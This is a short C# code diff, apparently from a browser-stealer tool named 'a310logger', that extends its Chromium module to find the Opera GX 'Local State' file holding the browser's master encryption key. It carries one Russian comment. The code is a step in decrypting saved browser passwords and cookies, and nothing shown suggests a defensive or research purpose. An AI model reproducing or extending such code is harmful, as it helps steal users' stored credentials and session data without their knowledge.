@@ -109,8 +109,18 @@ namespace a310logger.Chromium
 
             byte[] bMasterKey = new byte[] { };
 
-            if (!File.Exists(sLocalStateFile))
-                return null;
+             if (!File.Exists(sLocalStateFile))
+            {
+                sLocalStateFile = sLocalStateFolder;
+
+                if (!sLocalStateFile.Contains("Opera"))
+                    return null;
+                
+                sLocalStateFile += "\\Opera GX Stable\\Local State";
+                
+                if (!File.Exists(sLocalStateFile))
+                    return null;
+            }
 
             // Ну карочи так быстрее работает, да
             if (sLocalStateFile != sPrevBrowserPath)
